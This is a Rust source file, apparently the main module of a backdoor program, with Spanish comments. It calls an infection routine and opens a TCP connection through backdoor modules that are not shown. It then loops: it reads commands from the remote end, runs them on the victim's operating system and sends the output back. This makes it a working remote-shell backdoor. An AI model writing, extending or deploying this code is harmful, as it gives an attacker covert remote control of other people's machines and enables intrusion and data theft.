use std::io::prelude::*;
use std::net::TcpStream;
use std::str::from_utf8;
mod backdoor;


fn main() -> std::io::Result<()> {
    backdoor::infect::start_infection();
    let mut stream: TcpStream = backdoor::start_connection::establish_connection(10);
    loop {
        let mut data = [0; 1024];// hay que tener esto para manejar una gran cantidad de datos , con 6 bytes no basta ya que solo te da una salida de 6 caracteres
        match stream.read(&mut data) {
            Ok(_) => {

                let command = String::from_utf8(from_utf8(&data).unwrap().as_bytes().to_vec()).expect("Found invalid UTF-8");
                let command = command.trim_matches(char::from(0));

                let result = backdoor::execute_depending_of_os::execute_command(command);
                
                if result.is_ok(){
                    let mut r = result.unwrap();

                    let result_vec = &mut r.stdout;
                    result_vec.push(10); // inserta /n para que el stdout y el stderr no se vea todo junto
                    result_vec.append(&mut r.stderr);

                    let t_s = &result_vec.as_slice()[..];
                    stream.write(t_s).unwrap();
                }
                stream.flush().unwrap();
                ()
            }
            Err(_) => (),
        }
    }
}